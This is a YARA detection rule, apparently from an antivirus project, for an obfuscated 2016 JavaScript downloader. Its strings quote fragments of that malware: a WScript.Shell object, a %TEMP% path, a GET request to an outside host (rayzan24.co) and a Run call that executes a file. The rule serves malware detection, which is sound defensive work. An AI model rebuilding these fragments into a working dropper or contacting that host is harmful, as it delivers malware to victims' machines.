rule sig_20160427_bef22e80d88f636fac44cc63081afb8a {
  meta:
    description = "datamaliciousorder - file 20160427_bef22e80d88f636fac44cc63081afb8a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "38e00c6d50db207fb727ef616a58aa387ce21fbd647d9083d71e737bb534b573"

  strings:
    $s1  = "function GwjhyDjsqu() {return UampdGsvop[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"7TV9ybR" ascii
    $s2  = "function GwjhyDjsqu() {return UampdGsvop[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"7TV9ybR" ascii
    $s3  = "var UampdGsvop = function GtgovNrgvm() {return PnjwpYxcdh[BbddhLrasy](\"WScript\"+\".Shell\");}(), DptecVdmft = 11;" fullword ascii
    $s4  = "function SyvjiXbyrb(XpsoqJooaa, LoflbWsfwh){PrfwfNnyhj = PrfwfNnyhj * 1; return XpsoqJooaa - LoflbWsfwh;};" fullword ascii
    $s5  = "UpxzzMytyj[VhligRjsbl](\"G\" + \"ET\", \"http://rayzan24.co/m3usjd\", false);" fullword ascii
    $s6  = "var PnjwpYxcdh = this[\"WScript\"];" fullword ascii
    $s7  = "if (UpxzzMytyj[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function BntizGcjnf(){return FquvsQlhqx + \"\";};" fullword ascii
    $s9  = "function WmclrNvejg() {return ((XwhzsHdzhv == true) && (XwhzsHdzhv == PwhqcSosip)) ? 1 : PrfwfNnyhj;};" fullword ascii
    $s10 = "function DtdcjPkyra(){return BbddhLrasy;};" fullword ascii
    $s11 = "}while (XchrvHnxen);" fullword ascii
    $s12 = "var PwhqcSosip = false;" fullword ascii
    $s13 = "return SyvjiXbyrb(JlixcJiavf, LlmoeKxthg);" fullword ascii
    $s14 = "function KfneuEgeyo(RklvpTblat) {var QmamnMctup = (1, 2, 3, 4, 5, RklvpTblat); return QmamnMctup;};" fullword ascii
    $s15 = "function LgjfqCmgzn()" fullword ascii
    $s16 = "WwqzyCbwzy = true;" fullword ascii
    $s17 = "PwhqcSosip = true; " fullword ascii
    $s18 = "XwhzsHdzhv = true; " fullword ascii
    $s19 = "var XwhzsHdzhv = false;" fullword ascii
    $s20 = "function CcotdCslkt(WheowXlckf){UampdGsvop[\"R\"+\"un\"](WheowXlckf, PrfwfNnyhj, PrfwfNnyhj);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}